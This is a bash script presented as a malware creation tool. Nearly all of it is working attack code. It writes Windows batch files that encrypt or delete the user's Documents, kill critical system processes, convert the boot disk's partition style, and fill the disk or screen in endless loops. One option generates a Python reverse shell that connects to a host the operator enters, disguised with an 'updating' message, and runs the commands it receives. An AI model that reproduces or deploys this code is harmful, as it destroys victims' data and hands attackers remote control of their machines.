
#start

#clear_screen
clear


#variables

user=$(pwd)
dateandtime=$(date)

red='\033[0;31m'
cyan='\033[0;36m'
yellow='\033[0;33m'
white='\033[0;37m'
green='\033[0;32m'


echo -e "${green}"
echo -e                "                    ____  ____  __      _  __   __ "
echo -e                "        	   / ___|| ___ | |     / \ \ \ / /  "
echo -e                "     	           \___ \|  _| | |    / _ \ \   /  "
echo -e                "     		    ___) | |___| |___/ ___ \ | |  "
echo -e                "     		   |____/|_____|____/_/   \_\|_|  "
echo ""
echo ""

echo -e "                       ${yellow}WELCOME TO SELAY_${green}E${yellow}T${red}H${white}"
echo -e "    ${yellow}Advanced Malware creation tool(FOR EDUCATIONAL PURPOSE ONLY)"
echo -e "                         MADE BY ${cyan}B3NJI${white}         "
echo -e "${green}Usage: ./selay.sh [os(-win)] [malware_type(1-5) [filename_only]${white}"
echo -e "${green}Read "README.md" for more info.${white}"
echo "$dateandtime"
#sections
sec1=$1
sec2=$2
sec3=$3


#conditions
if [[ "$sec1" = "-win" ]] &&  [[ "$sec2" = "1" ]];
then


#crowder_malware_writer
echo "taskkill /f /im explorer.exe">output/$sec3.bat #kills explorer.exe
echo "cipher /e *">>output/$sec3.bat  #encrypts files
echo ":l">>output/$sec3.bat #function
echo "set a=%random%">>output/$sec3.bat   #sets random number to variable
echo "echo %a%>%a%.%a%">>output/$sec3.bat #stores random number in the file
echo "goto l">>output/$sec3.bat #loop

echo -e "${yellow}[+]Creating malware..."
sleep 2


echo -e "${cyan}[+]File $sec3 saved at $user/output/"
sleep 1

echo -e "${red}[+]WARNING : Do not test malware on your own computer!${white}"



elif [[ "$sec1" = "-win" ]] && [[ "$sec2" = "2" ]];
then

#converts_mbr_to_gpt

echo "diskpart && list disk">output/$sec3.bat #opens diskpart for later conversion
echo "select disk 0">>output/$sec3.bat  #selects disk 0 by default
echo "convert gpt">>output/$sec3.bat  #diskpart converts mbr to gpt
echo "exit">>output/$sec3.bat #exits
echo -e "${yellow}[+]Creating malware..."
sleep 2


echo -e "${cyan}[+]File $sec3 saved at $user/output"
sleep 1


echo -e "${red}[+]WARNING : Do not test malware on your own computer!${white}"


elif [[ "$sec1" =  "-win" ]] && [[ "$sec2" = "3" ]];
then

#document_deleting_malware_writer

echo "cd C:/Users/%USERNAME%/Documents">output/$sec3.bat
echo "del *">>output/$sec3.bat
echo "taskkill /f /im explorer.exe">>output/$sec3.bat #kills explorer.exe process
echo "taskkill /f /im svchost.exe">>output/$sec3.bat  #kills svchost.exe service
echo "taskkill /f /im csrss.exe">>output/$sec3.bat  #kills csrss.exe(client-server-runtime-process)
echo "taskkill /f /im wininit.exe">>output/$sec3.bat  #kills wininit.exe(windows startup application)

echo -e "${yellow}[+]Creating malware..."

sleep 2

echo -e "${cyan}[+]File $sec3 saved at $user/output/"
sleep 1


echo -e "${red}[+]WARNING : Do not test malware on your own computer!${white}"


elif [[ "$sec1" = "-win" ]] && [[ "$sec2" = "4" ]];
then

#infinite_screens_malware_writer
echo "cd C:/Users/%USERNAME%/Documents">output/$sec3.bat  #changes directory to Documents
echo "cipher /e *">>output/$sec3.bat  #encrypts files
echo "taskkill /f /im explorer.exe">>output/$sec3.bat #kills explorer.exe
echo ":l">>output/$sec3.bat #function
echo "start">>output/$sec3.bat  #starts cmd.exe window
echo "goto l">>output/$sec3.bat #loop

echo -e "${yellow}[+]Creating malware..."
sleep 2

echo -e "${cyan}[+]File $sec3 saved at $user/output/"
sleep 1

echo -e "${red}[+]WARNING : Do not test malware on your own computer!${white}"



elif [[ "$sec1" = "-win" ]] && [[ "$sec2" = "5" ]];
then

echo -e "${yellow}NOTE:If you are using ngrok use tcp port 5555!${white}"

read -p 'ENTER HOST: ' ll1
read -p 'ENTER PORT: ' ll2
#selay_remote_access_tool_malware_writer


echo "import socket">output/$sec3.py
echo "import subprocess">>output/$sec3.py
echo "HOST = '$ll1'">>output/$sec3.py
echo "PORT = $ll2">>output/$sec3.py
echo "s = socket.socket()">>output/$sec3.py
echo "s.connect((HOST, PORT))">>output/$sec3.py
echo "msg2 = 'UPDATING DO NOT CLOSE!'">>output/$sec3.py
echo "msg = s.recv(1024).decode()">>output/$sec3.py
echo "print('[*]log:', msg)">>output/$sec3.py
echo "print(msg2)">>output/$sec3.py
echo "while True:">>output/$sec3.py
echo "  cmd = s.recv(1024).decode()">>output/$sec3.py
echo "  print(f'[*]log: {cmd}')">>output/$sec3.py
echo "  if cmd.lower() == 'quit':">>output/$sec3.py
echo "    break">>output/$sec3.py
echo "  try:">>output/$sec3.py
echo "    result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)">>output/$sec3.py
echo "  except Exception as e:">>output/$sec3.py
echo "    result = str(e).encode()">>output/$sec3.py
echo "  if len(result) == 0:">>output/$sec3.py
echo "    result = 'OK'.encode()">>output/$sec3.py
echo "  s.send(result)">>output/$sec3.py
echo "s.close()">>output/$sec3.py

echo -e "${yellow}[+]Creating malware..."


sleep 2


echo -e "${cyan}[+]File $sec3 saved at $user/output/"
sleep 1

echo -e "${red}[+]WARNING : Do not test malware on your own computer!${white}"

sleep 1
echo -e "${cyan}[+]Status:Setting up Selay-server...${white}"
sleep 2

python3 selay-server.py


fi



#end
